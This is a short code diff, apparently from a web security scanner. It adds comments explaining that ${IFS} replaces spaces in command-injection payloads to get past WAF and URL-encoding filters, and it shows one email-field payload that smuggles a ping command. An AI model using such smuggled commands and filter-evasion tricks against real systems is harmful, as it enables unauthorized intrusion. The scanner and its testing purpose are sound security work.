@@ -50,8 +50,11 @@ SIGNUP_PATH_PATTERNS = re.compile(
     re.IGNORECASE,
 )
 
-# Command injection payloads using ${IFS} instead of spaces
-# NEVER use %20 for spaces in OS command payloads
+# Command injection payloads using ${IFS} instead of spaces.
+# ${IFS} is the Internal Field Separator variable in bash, which defaults to
+# space/tab/newline. Using it instead of literal spaces or %20 bypasses WAF
+# rules and URL encoding filters that block space characters in command payloads.
+# NEVER use %20 for spaces in OS command payloads.
 EMAIL_CMD_PAYLOADS = [
     # Pipe-chain variants
     'test@x]||ping${IFS}-c${IFS}5${IFS}127.0.0.1||',
